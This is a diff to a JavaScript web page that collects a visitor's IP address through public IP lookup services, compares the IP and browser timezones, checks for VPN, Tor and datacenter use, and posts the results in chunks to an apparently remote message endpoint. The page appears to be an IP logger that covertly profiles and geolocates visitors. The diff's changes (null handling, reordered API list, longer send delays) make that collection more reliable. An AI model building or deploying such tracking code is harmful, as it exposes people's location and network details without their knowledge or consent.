@@ -72,9 +72,9 @@
                         body: JSON.stringify({content: chunks[i]})
                     });
                     
-                    // Wait 1 second between messages to avoid rate limiting
+                    // Wait 2 seconds between messages to avoid rate limiting
                     if(i < chunks.length - 1) {
-                        await new Promise(resolve => setTimeout(resolve, 1000));
+                        await new Promise(resolve => setTimeout(resolve, 2000));
                     }
                 } catch(err) {
                     console.error("Failed to send chunk " + (i + 1), err);
@@ -115,18 +115,18 @@
 
         // Check timezone mismatch
         function checkTimezoneMismatch(ipTimezone, ipCountry, browserTimezone) {
-            if (!ipTimezone || ipTimezone === "Unknown") {
+            if (!ipTimezone || ipTimezone === "Unknown" || ipTimezone === null || ipTimezone === undefined) {
                 return "Unable to verify";
             }
 
-            const browserTz = browserTimezone.toLowerCase().replace(/_/g, ' ');
-            const ipTz = ipTimezone.toLowerCase().replace(/_/g, ' ');
+            const browserTz = String(browserTimezone).toLowerCase().replace(/_/g, ' ');
+            const ipTz = String(ipTimezone).toLowerCase().replace(/_/g, ' ');
 
             if (browserTz === ipTz) {
                 return "✓ Match";
             }
 
-            if (ipCountry && browserTimezone.toLowerCase().includes(ipCountry.toLowerCase())) {
+            if (ipCountry && String(browserTimezone).toLowerCase().includes(String(ipCountry).toLowerCase())) {
                 return "✓ Same region";
             }
 
@@ -155,11 +155,13 @@
         // gather system info
         async function collectInfo() {
             let data = {};
+            let ip = "Unknown";
             
+            // Try to get IP from multiple sources
             const apis = [
-                "https://ipapi.co/json/",
+                "https://api.ipify.org?format=json",
                 "https://ipwho.is/",
-                "https://api.ipify.org?format=json"
+                "https://ipapi.co/json/"
             ];
 
             for(let i = 0; i < apis.length; i++) {
@@ -168,17 +170,18 @@
                     if(response.ok) {
                         const json = await response.json();
                         data = Object.assign(data, json);
-                        if(data.ip || data.query) break;
+                        if(data.ip || data.query) {
+                            ip = data.ip || data.query || "Unknown";
+                            break;
+                        }
                     }
                 } catch(err) {
-                    // silent fail, try next API
+                    console.log("API " + i + " failed, trying next...");
                 }
             }
 
-            const ip = data.ip || data.query || "Unknown";
-
             const browserTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const ipTimezone = data.timezone || "Unknown";
+            const ipTimezone = data.timezone || null;
             const ipCountry = data.country_code || data.country || "";
 
             const vpnCheck = await checkVPNDatabase(ip);
@@ -454,7 +457,7 @@
                 "Tor Network": vpnCheck.isTor,
                 "Hosting/Datacenter": vpnCheck.isHosting,
                 "Timezone Mismatch": timezoneMismatch,
-                "IP Timezone": ipTimezone,
+                "IP Timezone": ipTimezone || "Unknown",
                 "Browser Timezone": browserTimezone,
                 "--- NETWORK DATA ---": "",
                 "IP Address": ip,
